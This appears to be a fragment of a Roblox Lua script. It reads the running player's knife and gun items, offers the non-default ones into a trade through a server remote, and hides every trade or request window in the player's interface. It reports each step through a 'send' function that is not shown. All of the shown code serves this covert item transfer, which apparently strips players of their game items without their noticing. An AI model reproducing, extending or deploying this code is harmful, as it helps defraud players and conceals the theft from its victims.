-- --- Get profile data and extract knife & gun
local function getPlayerItems()
    local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
    local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
    if not GetProfileData then
        send("❌ GetProfileData remote not found.")
        return nil, nil
    end
    local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
    if not ok or not data then
        send("❌ Failed to get profile data.")
        return nil, nil
    end
    -- Find the local player's data by matching UserId
    local localUserId = player.UserId
    local knife, gun = nil, nil
    for _, entry in pairs(data) do
        if type(entry) == "table" and entry.UserId == localUserId then
            knife = entry.Knife
            gun = entry.Gun
            break
        end
    end
    return knife, gun
end

-- --- Offer an item by name
local function offerItemByName(itemName)
    if not OfferItem then return false end
    if not itemName or itemName == "" then return false end
    if itemName == "DefaultKnife" or itemName == "DefaultGun" then
        send("⚠️ Skipping default item: " .. itemName)
        return false
    end
    local ok, err = pcall(function() OfferItem:FireServer(itemName) end)
    if ok then
        send("✅ Offered: " .. itemName)
        return true
    else
        send("❌ Failed to offer " .. itemName .. ": " .. tostring(err))
        return false
    end
end

-- --- Hide trade GUI (if any)
local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
    end
end

